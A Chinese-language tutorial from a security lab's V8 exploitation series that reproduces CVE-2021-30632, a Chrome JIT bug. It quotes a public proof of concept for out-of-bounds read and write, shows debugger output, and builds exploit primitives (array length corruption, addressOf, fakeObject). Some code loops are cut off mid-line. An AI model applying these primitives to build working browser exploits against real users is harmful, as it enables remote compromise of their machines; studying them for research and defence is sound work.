**作者：Hcamael@知道创宇404实验室**
**相关阅读：[从 0 开始学 V8 漏洞利用之环境搭建（一）](https://paper.seebug.org/1820/ "从 0 开始学 V8
漏洞利用之环境搭建（一）")  
[从 0 开始学 V8 漏洞利用之 V8 通用利用链（二）](https://paper.seebug.org/1821/ "从 0 开始学 V8
漏洞利用之 V8 通用利用链（二）")  
[从 0 开始学 V8 漏洞利用之 starctf 2019 OOB（三）](https://paper.seebug.org/1822/ "从 0 开始学
V8 漏洞利用之 starctf 2019 OOB（三）")  
[从 0 开始学 V8 漏洞利用之 CVE-2020-6507（四）](https://paper.seebug.org/1823/ "从 0 开始学 V8
漏洞利用之 CVE-2020-6507（四）")**
复现CVE-2021-30632
第三个研究的是`CVE-2021-30632`，其chrome的bug编号为：1247763
不过其相关信息还未公开，但是我们仍然能得知：
受影响的Chrome最高版本为：`93.0.4577.63` 受影响的V8最高版本为：`9.3.345.16`
不过网上能搜到一篇分析文章Chrome in-the-wild bug analysis:
CVE-2021-30632，不过文章中只有PoC，不包含EXP，PoC如下：
    function foo(b) {
      x = b;
    }
    function oobRead() {
      return [x[20],x[24]];
    }
    function oobWrite(addr) {
      x[24] = addr;
    }
    //All have same map, SMI elements, MapA
    var arr0 = new Array(10); arr0.fill(1);arr0.a = 1;
    var arr1 = new Array(10); arr1.fill(2);arr1.a = 1;
    var arr2 = new Array(10); arr2.fill(3); arr2.a = 1;
    var x = arr0;
    var arr = new Array(30); arr.fill(4); arr.a = 1;
    ...
    //Optimzie foo
    for (let i = 0; i  [FastProperties]
     - prototype: 0x3407081cc139 
     - elements: 0x34070804a1b1  [HOLEY_SMI_ELEMENTS]
     - length: 30
     - properties: 0x34070804a231 
     - All own properties (excluding elements): {
        0x340708004905: [String] in ReadOnlySpace: #length: 0x34070814215d  (const accessor descriptor), location: descriptor
        0x340708007aad: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: properties[0]
     }
     - elements: 0x34070804a1b1  {
            0-29: 5
     }
    ......
然后挂上GDB进行调试，发现变量`z`的值(`0x80023b500000002`)位于`elements + 8 + 16 *
8`，从这可以看出该PoC达到了越界读的效果，同理，`oobWrite`函数能达到越界写的目的。
那么我们可以按以下顺序定义变量：
    var arr = new Array(30); arr.fill(4); arr.a = 1;
    var trigger_array = [1.1];
    var padding = [1.1];
    var vul_obj = {"a" : 1};
那么通过`arr`的越界读，我们可以获取到下面三个变量的相关信息。具体的偏移可以通过gdb调试获取，比如`trigger_array`变量的偏移为`20`。我可以通过`oobWrite`函数去修改`trigger_array`变量的size位，转换为`trigger_array`变量的越界利用。
根据上述的数据去修改`oobWrite`函数和`oobRead`函数：
    function oobRead() {
      return x[21];
    }
    function oobWrite(addr) {
      x[21] = addr;
    }
然后就是修改`trigger_array`的`size`，把`trigger_array`数组的大小改为0x20:
    var z = oobRead();
    console.log("[*] leak data: 0x"+hex(ftoi(z)));
    if (d2u(z)[1] == 2)
      oobWrite(u2d(d2u(z)[0], 0x20));
    else
      oobWrite(u2d(0x20, d2u(z)[1]));
## 编写addressOf函数
现在我们能来编写addressOf函数了：
    function addressOf(obj_to_leak)
    {
        vul_obj[0] = obj_to_leak;
        trigger_array[7] = array_map;
        let obj_addr = ftoi(vul_obj[0])-1n;
        trigger_array[7] = obj_map;
        return obj_addr;
    }
## 编写fakeObj函数
接下来就是编写`fakeObj`函数：
    function fakeObject(addr_to_fake)
    {
        padding[0] = itof(addr_to_fake + 1n);
        trigger_array[5] = obj_map;
        let faked_obj = padding[0];
        trigger_array[5] = array_map;
        return faked_obj;
    }
## 其他
剩下的工作就是按照惯例，套模板，修改偏移了，这PoC目前我也没觉得哪里有需要优化的地方。
# 漏洞简述
在文章开头，就给了一篇分析文章，原理在这篇文章也讲的很清楚了，我这里就不展开再写了。我就简单概括一下说说我的理解。
首先是对`foo`函数进行JIT优化：
    //Optimzie foo
    for (let i = 0; i 
  2. 
* * *